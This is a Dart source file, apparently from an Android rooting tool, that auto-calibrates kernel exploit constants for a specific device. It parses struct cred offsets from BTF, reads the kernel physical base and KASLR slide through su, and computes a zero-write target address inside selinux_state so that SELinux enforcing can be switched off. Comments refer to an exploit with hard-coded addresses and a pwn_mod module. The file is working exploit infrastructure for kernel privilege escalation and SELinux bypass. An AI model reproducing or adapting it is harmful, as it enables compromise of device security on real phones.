import 'dart:convert';
import 'dart:typed_data';

import 'known_kernels.dart';
import 'shizuku.dart';

/// 一项校准结果
class CalibItem {
  final String name;
  String value;
  bool ok;
  String note;
  bool auto;

  CalibItem(this.name,
      {this.value = '', this.ok = false, this.note = '', this.auto = true});

  Map<String, dynamic> toJson() =>
      {'name': name, 'value': value, 'ok': ok, 'note': note, 'auto': auto};

  static CalibItem fromJson(Map<String, dynamic> j) => CalibItem(
        j['name'] as String? ?? '',
        value: j['value'] as String? ?? '',
        ok: j['ok'] as bool? ?? false,
        note: j['note'] as String? ?? '',
        auto: j['auto'] as bool? ?? true,
      );
}

/// 设备侧自校准：把"按镜像校准的常量"尽量自动推出来。
/// 覆盖 5 项：
///   1) vermagic          ← /proc/version
///   2) tracepoint id     ← /sys/kernel/tracing/events/kmem/kmem_cache_alloc/id
///   3) cred 布局         ← /sys/kernel/btf/vmlinux（真 BTF 解析）+ /proc/slabinfo
///   4) module_layout CRC ← 任意 vendor .ko 的 __versions（koquery）
///   5) 内核物理基址      ← /proc/iomem "Kernel code"（需 root），推出 selinux 直映射别名
/// 简单 shell 单引号包裹（避免注入与引号问题）
String shq(String s) => "'${s.replaceAll("'", "'\\''")}'";

class Calibration {
  /// 原生件落盘目录（env 阶段部署到这里）
  static const String workDir = '/data/local/tmp/rk';

  // 1) vermagic
  String vermagic = '';
  // 2) tracepoint id
  int tracepointId = 324;
  // 3) cred 布局
  int credSize = 184;
  int offUid = 8, offEuid = 24, offFsuid = 32;
  int offCapPermitted = 56, offCapEffective = 64, offCapBset = 72;
  // 4) module_layout CRC
  int moduleLayoutCrc = 0x797f2b3e;
  // 5) 物理基址 & selinux 别名
  int physBase = 0xC7800000; // 本机型已验证
  int selinuxStateOffset = 0x27D7A60; // selinux_state - _stext（同镜像常量）
  int linkBase = 0xffffffc080010000; // _stext 链接地址
  static const int pageOffset = 0xffffff8000000000;
  static const int memStart = 0x80000000;

  final List<CalibItem> items = [];
  String bootId = '';
  String kernelVersion = ''; // /proc/version 的版本 token
  bool kernelKnown = false; // 是否命中内置记录/自定义记录
  String kernelSource = ''; // 'builtin' | 'custom' | 'iomem' | 'unknown'
  int textSlide =
      0; // _stext_real - 链接地址（KASLR slide），离线表模式需要   // 校准时所在 boot（换 boot 后需要重探物理基址等）

  /// selinux_state 的直映射别名（零写目标）
  /// 锚点：physBase ↔ 链接期 _text(0xffffffc080000000)；selinuxStateOffset 是相对 _stext 的偏移
  /// ⇒ 必须再加 0x10000（_stext = _text + 0x10000）。
  /// 自检：本机型应得 0xffffff8049fe7a60（与 exploit 硬编码、pwn_mod 的 ...7a61 一致）。
  String get selinuxAliasHex {
    // 必须用 BigInt：0xffffff7f80000000 + … 超过 int64 上限，用 int 会变成负数
    final p = (BigInt.from(pageOffset) - BigInt.from(memStart)) +
        BigInt.from(physBase) +
        BigInt.from(0x10000) +
        BigInt.from(selinuxStateOffset);
    return '0x${p.toUnsigned(64).toRadixString(16)}';
  }

  /// 「关 SELinux」零写的**实际落点**：selinux_state − 7
  ///
  /// 原因（2026-10-25 真机定位）：零写原语是 8 字节 store。若直接写 selinux_state 基址，
  /// 会连带清零 +1 的 `initialized` ⇒ `security_sid_to_context_core: called before initializing`
  /// ⇒ binder 取不到安全上下文、系统服务连环崩（相机 HAL `CamX::Actuator` 空指针、
  /// 电话/输入法 start timeout），且**软重启不清内核**，必须硬重启才恢复。
  ///
  /// 改写到 base−7：8 字节覆盖 [base−7 … base]，最后一个字节正好落在 `enforcing`，
  /// `initialized`(+1) 与 `status_page`(+8) 不受影响。base−7…base−1 是
  /// `avc_latest_notif_update.notif_lock`（raw_spinlock_t，未持锁时全 0）与对齐填充，
  /// 本机 CONFIG_DEBUG_SPINLOCK / DEBUG_LOCK_ALLOC 均未开 ⇒ 零写对它是 no-op。
  /// 自检：本机型 0xffffff8049fe7a59。
  String get selinuxZeroTargetHex {
    final p = (BigInt.from(pageOffset) - BigInt.from(memStart)) +
        BigInt.from(physBase) +
        BigInt.from(0x10000) +
        BigInt.from(selinuxStateOffset) -
        BigInt.from(7);
    return '0x${p.toUnsigned(64).toRadixString(16)}';
  }

  Map<String, dynamic> toJson() => {
        'vermagic': vermagic,
        'tracepointId': tracepointId,
        'credSize': credSize,
        'offUid': offUid,
        'offEuid': offEuid,
        'offFsuid': offFsuid,
        'offCapPermitted': offCapPermitted,
        'offCapEffective': offCapEffective,
        'offCapBset': offCapBset,
        'moduleLayoutCrc': moduleLayoutCrc,
        'physBase': physBase,
        'bootId': bootId,
        'kernelVersion': kernelVersion,
        'kernelKnown': kernelKnown,
        'kernelSource': kernelSource,
        'textSlide': textSlide,
        'items': items.map((e) => e.toJson()).toList(),
      };

  static Calibration fromJson(Map<String, dynamic> j) {
    final c = Calibration();
    int gi(String k, int def) => (j[k] as num?)?.toInt() ?? def;
    c.vermagic = j['vermagic'] as String? ?? '';
    c.tracepointId = gi('tracepointId', 324);
    c.credSize = gi('credSize', 184);
    c.offUid = gi('offUid', 8);
    c.offEuid = gi('offEuid', 24);
    c.offFsuid = gi('offFsuid', 32);
    c.offCapPermitted = gi('offCapPermitted', 56);
    c.offCapEffective = gi('offCapEffective', 64);
    c.offCapBset = gi('offCapBset', 72);
    c.moduleLayoutCrc = gi('moduleLayoutCrc', 0x797f2b3e);
    c.physBase = gi('physBase', 0xC7800000);
    c.bootId = j['bootId'] as String? ?? '';
    c.kernelVersion = j['kernelVersion'] as String? ?? '';
    c.kernelKnown = j['kernelKnown'] as bool? ?? false;
    c.kernelSource = j['kernelSource'] as String? ?? '';
    c.textSlide = gi('textSlide', 0);
    final it = (j['items'] as List?) ?? const [];
    c.items
      ..clear()
      ..addAll(it
          .map((e) => CalibItem.fromJson(Map<String, dynamic>.from(e as Map))));
    return c;
  }

  /// 把另一份校准的值拷进来（用于从 prefs 载入后复用）
  void applyFrom(Calibration o) {
    vermagic = o.vermagic;
    tracepointId = o.tracepointId;
    credSize = o.credSize;
    offUid = o.offUid;
    offEuid = o.offEuid;
    offFsuid = o.offFsuid;
    offCapPermitted = o.offCapPermitted;
    offCapEffective = o.offCapEffective;
    offCapBset = o.offCapBset;
    moduleLayoutCrc = o.moduleLayoutCrc;
    physBase = o.physBase;
    bootId = o.bootId;
    kernelVersion = o.kernelVersion;
    kernelKnown = o.kernelKnown;
    kernelSource = o.kernelSource;
    textSlide = o.textSlide;
    items
      ..clear()
      ..addAll(o.items);
  }

  Future<int?> _loadCustomPhys(String version) async {
    if (version.isEmpty) return null;
    final v = await ShizukuShell.getPref('phys.$version');
    if (v == null || v.isEmpty) return null;
    return int.tryParse(v.replaceAll('0x', ''), radix: 16);
  }

  Future<void> _saveCustomPhys(String version, int value) async {
    if (version.isEmpty) return;
    await ShizukuShell.setPref('phys.$version', '0x${value.toRadixString(16)}');
  }

  /// 手动设置内核物理基址（例如已从该机 boot.img 的 bootloader 配置推导出）
  /// 返回是否接受：要求 2MB 对齐且落在 0x80000000..0xFFFFFFFF
  bool setPhysBase(int value) {
    if (value < 0x80000000 || value > 0xffffffff) return false;
    if (value % 0x200000 != 0) return false;
    physBase = value;
    items.removeWhere((e) => e.name == '内核物理基址');
    items.add(CalibItem('内核物理基址',
        value: '0x${physBase.toRadixString(16)}',
        ok: true,
        note: '手动填入（来自 boot.img 推导）'));
    items.removeWhere((e) => e.name == 'selinux 别名');
    items.add(CalibItem('selinux 别名',
        value: selinuxAliasHex, ok: true, note: '由手动基址重算'));
    kernelKnown = true;
    kernelSource = 'custom';
    // 存成该内核版本的记录，下次同内核直接命中
    // ignore: discarded_futures
    _saveCustomPhys(kernelVersion, value);
    return true;
  }

  Future<void> save() async {
    await ShizukuShell.setPref('calib', jsonEncode(toJson()));
  }

  static Future<Calibration> load() async {
    final raw = await ShizukuShell.getPref('calib');
    if (raw == null || raw.isEmpty) return Calibration();
    try {
      return Calibration.fromJson(
          Map<String, dynamic>.from(jsonDecode(raw) as Map));
    } catch (_) {
      return Calibration();
    }
  }

  // ------------------------------------------------------------------ 探测

  /// 执行全部 5 项探测（要求的 root 项会自动尝试 `su -c`）
  Future<void> detect({void Function(String)? log}) async {
    items.clear();
    final b = await ShizukuShell.run('cat /proc/sys/kernel/random/boot_id');
    bootId = b.out.trim();
    void add(CalibItem it) {
      items.add(it);
      log?.call(
          '${it.ok ? "✓" : "✗"} ${it.name}: ${it.value}${it.note.isEmpty ? "" : " (${it.note})"}');
    }

    // ---- 1) vermagic ----
    {
      final r = await ShizukuShell.run('cat /proc/version');
      final v = r.out.trim();
      // "Linux version 6.12.58-android16-6-g... (kleaf@...) ..."
      final m = RegExp(r'Linux version (\S+)').firstMatch(v);
      final ver = m?.group(1) ?? '';
      kernelVersion = ver;
      if (ver.isNotEmpty) {
        // /proc/version 的 token 可能已带 -4k；不要重复拼接
        final base =
            ver.endsWith('-4k') ? ver.substring(0, ver.length - 3) : ver;
        vermagic = '$base-4k SMP preempt mod_unload modversions aarch64';
        add(CalibItem('vermagic', value: vermagic, ok: true));
      } else {
        add(CalibItem('vermagic', ok: false, note: '读不到 /proc/version'));
      }
    }

    // ---- 2) tracepoint id ----
    {
      final r = await ShizukuShell.run(
          'cat /sys/kernel/tracing/events/kmem/kmem_cache_alloc/id 2>/dev/null || '
          'cat /sys/kernel/debug/tracing/events/kmem/kmem_cache_alloc/id 2>/dev/null');
      final n = int.tryParse(r.out.trim());
      if (n != null && n > 0) {
        tracepointId = n;
        add(CalibItem('tracepoint id', value: '$n', ok: true));
      } else {
        add(CalibItem('tracepoint id',
            value: '$tracepointId', ok: true, note: 'sysfs 不可读，沿用默认值'));
      }
    }

    // ---- 3) cred 布局（BTF 优先，slabinfo 兜底）----
    {
      int? slabSize;
      final s = await ShizukuShell.run(
          "grep -m1 '^cred_jar' /proc/slabinfo 2>/dev/null | awk '{print \$4}'");
      slabSize = int.tryParse(s.out.trim());
      final btf = await ShizukuShell.run(
          'ls -la /sys/kernel/btf/vmlinux 2>/dev/null | awk \'{print \$5}\'');
      final btfSize = int.tryParse(btf.out.trim()) ?? 0;
      if (btfSize > 0) {
        final ok = await _detectCredFromBtf(log);
        if (!ok) {
          _credFromSlab(slabSize);
          add(CalibItem('cred 布局',
              value:
                  'size=$credSize fsuid=$offFsuid eff=$offCapEffective bset=$offCapBset',
              ok: true,
              note: 'BTF 解析失败，用 slabinfo 反推'));
        }
      } else {
        _credFromSlab(slabSize);
        add(CalibItem('cred 布局',
            value:
                'size=$credSize fsuid=$offFsuid eff=$offCapEffective bset=$offCapBset',
            ok: true,
            note: '无 BTF，用 slabinfo 反推'));
      }
    }

    // ---- 4) module_layout CRC：内置记录优先，其次问 vendor .ko（koquery）----
    {
      final knownK = lookupKernel(kernelVersion);
      if (knownK != null) {
        moduleLayoutCrc = knownK.moduleLayoutCrc;
        add(CalibItem('module_layout CRC',
            value: '0x${moduleLayoutCrc.toRadixString(16)}',
            ok: true,
            note: '内置记录（${knownK.version}）'));
        // 跳过 koquery 探测
      } else {
        final r = await ShizukuShell.run(
            'ls -d /vendor/lib/modules/*.ko 2>/dev/null | head -1');
        final ko = r.out.trim();
        if (ko.isNotEmpty) {
          // 注意：不能用 shq() 包整条命令，否则 $ko 不会被 shell 展开
          final q = await ShizukuShell.run('$workDir/koquery "$ko" 2>&1');
          final m =
              RegExp(r'module_layout_crc=(0x[0-9a-fA-F]+)').firstMatch(q.out);
          if (m != null) {
            moduleLayoutCrc = int.parse(m.group(1)!.substring(2), radix: 16);
            add(CalibItem('module_layout CRC',
                value: '0x${moduleLayoutCrc.toRadixString(16)}',
                ok: true,
                note: '来自 $ko'));
          } else {
            add(CalibItem('module_layout CRC',
                value: '0x${moduleLayoutCrc.toRadixString(16)}',
                ok: true,
                note:
                    'koquery 未取到（rc=${q.code} ${q.out.trim().split('\n').first}），沿用默认值'));
          }
        } else {
          add(CalibItem('module_layout CRC',
              value: '0x${moduleLayoutCrc.toRadixString(16)}',
              ok: true,
              note: '无 vendor .ko'));
        }
      }
    }

    // ---- 5) 物理基址：优先用内置/自定义记录（按内核版本），其次 /proc/iomem ----
    {
      final known = lookupKernel(kernelVersion);
      final custom = await _loadCustomPhys(kernelVersion);
      if (known != null) {
        physBase = known.physBase;
        selinuxStateOffset = known.selinuxStateOffset;
        kernelKnown = true;
        kernelSource = 'builtin';
        add(CalibItem('内核物理基址',
            value: '0x${physBase.toRadixString(16)}',
            ok: true,
            note: '内置记录：${known.version}'));
      } else if (custom != null) {
        physBase = custom;
        kernelKnown = true;
        kernelSource = 'custom';
        add(CalibItem('内核物理基址',
            value: '0x${physBase.toRadixString(16)}',
            ok: true,
            note: '自定义记录（手填保存，内核 $kernelVersion）'));
      } else {
        // 未知内核：先尝试 root 读 iomem，成功则记为自定义记录
        final r = await ShizukuShell.run(
            'su -c "grep -m1 -i \'Kernel code\' /proc/iomem" 2>/dev/null; '
            'grep -m1 -i \'Kernel code\' /proc/iomem 2>/dev/null');
        final m = RegExp(r'^([0-9a-fA-F]{8})-').firstMatch(r.out.trim());
        if (m != null) {
          final codePhys = int.parse(m.group(1)!, radix: 16);
          physBase = (codePhys & 0xFFF) == 0 && codePhys >= 0x10000
              ? codePhys - 0x10000
              : codePhys;
          kernelKnown = true;
          kernelSource = 'iomem';
          await _saveCustomPhys(kernelVersion, physBase);
          add(CalibItem('内核物理基址',
              value: '0x${physBase.toRadixString(16)}',
              ok: true,
              note: '未知内核，但已从 /proc/iomem 取到并保存为该版本记录'));
        } else {
          kernelKnown = false;
          kernelSource = 'unknown';
          add(CalibItem('内核物理基址',
              value: '0x${physBase.toRadixString(16)}',
              ok: false,
              note: '未知内核（$kernelVersion）：请『手填物理基址』或提供 boot.img；'
                  '未确认前不会运行'));
        }
      }
      // 交叉校验：root 下可直接读 selinux_state 符号，与算式结果比对
      final sv = await ShizukuShell.run(
          'su -c "grep -m1 -w selinux_state /proc/kallsyms" 2>/dev/null');
      final mv = RegExp(r'^([0-9a-fA-F]{16})\s+\S+\s+selinux_state')
          .firstMatch(sv.out.trim());
      String note = '';
      var aliasOk = true;
      if (mv != null) {
        final va = int.parse(mv.group(1)!, radix: 16);
        // VA -> 预期别名：alias = VA - _stext_link + (_text_phys 直映射)
        final expect = (pageOffset - memStart + physBase) +
            0x10000 +
            (va - 0xffffffc080010000);
        final got = int.parse(selinuxAliasHex.substring(2), radix: 16);
        if (expect != got) {
          aliasOk = false;
          note = '与 kallsyms 交叉校验不符（expect 0x${expect.toRadixString(16)}）';
        } else {
          note = '与 kallsyms 交叉校验一致';
        }
      } else {
        note = '无法交叉校验（读不到 selinux_state）';
      }
      add(CalibItem('selinux 别名',
          value: selinuxAliasHex, ok: aliasOk, note: note, auto: true));
    }

    // 尝试取 KASLR slide（离线表模式需要；无 root 则保持 0）
    {
      final r = await ShizukuShell.run(
          'su -c "grep -m1 -w _stext /proc/kallsyms" 2>/dev/null');
      final m = RegExp(r'^([0-9a-fA-F]{16})').firstMatch(r.out.trim());
      if (m != null) {
        final real = int.parse(m.group(1)!, radix: 16);
        textSlide = real - 0xffffffc080010000;
        items.add(CalibItem('KASLR slide',
            value: '0x${textSlide.toRadixString(16)}',
            ok: true,
            note: '来自 /proc/kallsyms _stext（离线表模式用）'));
      } else {
        // 仅在走"离线符号表"时才需要 slide；能读真地址时不需要，故不作为失败项
        items.add(CalibItem('KASLR slide',
            value: '0x${textSlide.toRadixString(16)}',
            ok: true,
            note: textSlide == 0
                ? '无 root 未取到（可选：仅离线表模式需要；真地址路径不需要）'
                : '沿用已保存值'));
      }
    }

    await save();
  }

  void _credFromSlab(int? slabSize) {
    if (slabSize != null && slabSize > 0) credSize = slabSize;
    // struct cred 的标准布局（6.x 稳定）：usage@0(8) uid@8 gid@12 suid@16 sgid@20
    // euid@24 egid@28 fsuid@32 fsgid@36 securebits@40 (pad4) cap_inh@48 cap_perm@56
    // cap_eff@64 cap_bset@72 cap_amb@80
    offUid = 8;
    offEuid = 24;
    offFsuid = 32;
    offCapPermitted = 56;
    offCapEffective = 64;
    offCapBset = 72;
  }

  /// 真 BTF 解析：把 /sys/kernel/btf/vmlinux 分块读回，找 struct cred 的成员偏移
  Future<bool> _detectCredFromBtf(void Function(String)? log) async {
    // 1) 读头部 24 字节
    final h = await ShizukuShell.run(
        'su -c "xxd -l 24 -p /sys/kernel/btf/vmlinux" 2>/dev/null || '
        'xxd -l 24 -p /sys/kernel/btf/vmlinux 2>/dev/null');
    final hex = h.out.replaceAll(RegExp(r'\s'), '');
    if (hex.length < 48) return false;
    final hb = _unhex(hex);
    final magic = _u16(hb, 0);
    if (magic != 0xeB9F) {
      log?.call('BTF magic 不符：0x${magic.toRadixString(16)}');
      return false;
    }
    final hdrLen = _u32(hb, 4);
    final typeOff = _u32(hb, 8);
    final typeLen = _u32(hb, 12);
    final strOff = _u32(hb, 16);
    final strLen = _u32(hb, 20);
    log?.call('BTF hdr=$hdrLen typeLen=$typeLen strLen=$strLen');

    // 2) 读 type 段 + str 段（分块，避免一次太大）
    final types = await _readFileHex(
        '/sys/kernel/btf/vmlinux', hdrLen + typeOff, typeLen, log);
    final strs = await _readFileHex(
        '/sys/kernel/btf/vmlinux', hdrLen + strOff, strLen, log);
    if (types == null || strs == null) return false;

    // 3) 扫 type 段找 STRUCT "cred"
    int off = 0;
    while (off + 12 <= types.length) {
      final nameOff = _u32(types, off);
      final info = _u32(types, off + 4);
      final kind = (info >> 24) & 0x1f;
      final vlen = info & 0xffff;
      final kflag = (info >> 31) & 1;
      var sz = 12;
      if (kind == 4 /*STRUCT*/ || kind == 5 /*UNION*/) {
        final size = _u32(types, off + 8);
        final nm = _str(strs, nameOff);
        if (kind == 4 && nm == 'cred') {
          // members: name_off,type,offset (bit offset when kflag==0)
          final members = <String, int>{};
          var mOff = off + 12;
          for (var i = 0; i < vlen; i++) {
            if (mOff + 12 > types.length) break;
            final mName = _str(strs, _u32(types, mOff));
            final mOffBits = _u32(types, mOff + 8);
            members[mName] = kflag == 1 ? (mOffBits & 0xffffff) : mOffBits;
            mOff += 12;
          }
          int bitToByte(int? bits) => bits == null ? -1 : bits ~/ 8;
          final fsuid = bitToByte(members['fsuid']);
          final euid = bitToByte(members['euid']);
          final uid = bitToByte(members['uid']);
          final eff = bitToByte(members['cap_effective']);
          final bset = bitToByte(members['cap_bset']);
          final perm = bitToByte(members['cap_permitted']);
          if (fsuid < 0 || eff < 0 || bset < 0) {
            log?.call('BTF: cred 成员缺失 fsuid=$fsuid eff=$eff bset=$bset');
            return false;
          }
          credSize = size;
          offUid = uid >= 0 ? uid : 8;
          offEuid = euid >= 0 ? euid : 24;
          offFsuid = fsuid;
          offCapPermitted = perm >= 0 ? perm : 56;
          offCapEffective = eff;
          offCapBset = bset;
          items.add(CalibItem('cred 布局',
              value: 'size=$credSize uid=$offUid euid=$offEuid fsuid=$offFsuid '
                  'perm=$offCapPermitted eff=$offCapEffective bset=$offCapBset',
              ok: true,
              note: 'BTF 解析'));
          return true;
        }
        sz = 12 + vlen * 12;
      } else if (kind == 1 /*INT*/) {
        sz = 16;
      } else if (kind == 3 /*ARRAY*/) {
        sz = 12 + 12;
      } else if (kind == 6 /*ENUM*/) {
        sz = 12 + vlen * 8;
      } else if (kind == 14 /*VAR*/) {
        sz = 12 + 4;
      } else if (kind == 15 /*DATASEC*/) {
        sz = 12 + vlen * 12;
      } else if (kind == 16 /*FLOAT*/) {
        sz = 12;
      } else if (kind == 17 /*DECL_TAG*/) {
        sz = 12 + 4;
      } else if (kind == 18 /*TYPE_TAG*/) {
        sz = 12;
      } else if (kind == 19 /*ENUM64*/) {
        sz = 12 + vlen * 12;
      } else if (kind == 2 /*PTR*/ || kind == 7 /*FWD*/) {
        sz = 12;
      } else if (kind == 8 /*TYPEDEF*/ ||
          kind == 9 /*VOLATILE*/ ||
          kind == 10 /*CONST*/ ||
          kind == 11 /*RESTRICT*/ ||
          kind == 12 /*FUNC*/) {
        sz = 12;
      } else {
        // FUNC_PROTO(13)：params 每个 8 字节
        sz = 12 + vlen * 8;
      }
      off += sz;
    }
    return false;
  }

  Future<Uint8List?> _readFileHex(
      String path, int start, int len, void Function(String)? log) async {
    const chunk = 262144; // 256KB/次，减少 su 往返
    final out = Uint8List(len);
    var got = 0;
    while (got < len) {
      final n = (len - got) > chunk ? chunk : (len - got);
      // iflag=skip_bytes,count_bytes：按字节而不是按 bs 块计，避免 1 字节 read 放大成 N 次系统调用
      final cmd = 'su -c "dd if=$path bs=262144 iflag=skip_bytes,count_bytes '
          'skip=${start + got} count=$n 2>/dev/null | base64 -w0" 2>/dev/null || '
          'dd if=$path bs=262144 iflag=skip_bytes,count_bytes skip=${start + got} '
          'count=$n 2>/dev/null | base64 -w0';
      var okThis = false;
      for (var attempt = 0; attempt < 3 && !okThis; attempt++) {
        final r = await ShizukuShell.run(cmd, timeoutMs: 180000);
        final b64 = r.out.replaceAll(RegExp(r'\s'), '');
        if (b64.isEmpty) continue;
        Uint8List b;
        try {
          b = base64Decode(b64);
        } catch (_) {
          continue;
        }
        if (b.isEmpty) continue;
        // 短读：按实际字节推进，下次接着读（sysfs bin_attribute 常见）
        final take = b.length < n ? b.length : n;
        out.setRange(got, got + take, b.sublist(0, take));
        got += take;
        okThis = true;
        if (take < n) log?.call('BTF 短读 ${take}/$n，继续…');
      }
      if (!okThis) {
        log?.call('读 BTF 段失败（重试 3 次）got=$got/$len');
        return null;
      }
    }
    return out;
  }

  static Uint8List _unhex(String h) {
    final n = h.length ~/ 2;
    final b = Uint8List(n);
    for (var i = 0; i < n; i++) {
      b[i] = int.parse(h.substring(i * 2, i * 2 + 2), radix: 16);
    }
    return b;
  }

  static int _u16(Uint8List b, int o) => b[o] | (b[o + 1] << 8);
  static int _u32(Uint8List b, int o) =>
      b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24);

  static String _str(Uint8List s, int off) {
    if (off <= 0 || off >= s.length) return '';
    var e = off;
    while (e < s.length && s[e] != 0) {
      e++;
    }
    return String.fromCharCodes(s.sublist(off, e));
  }
}
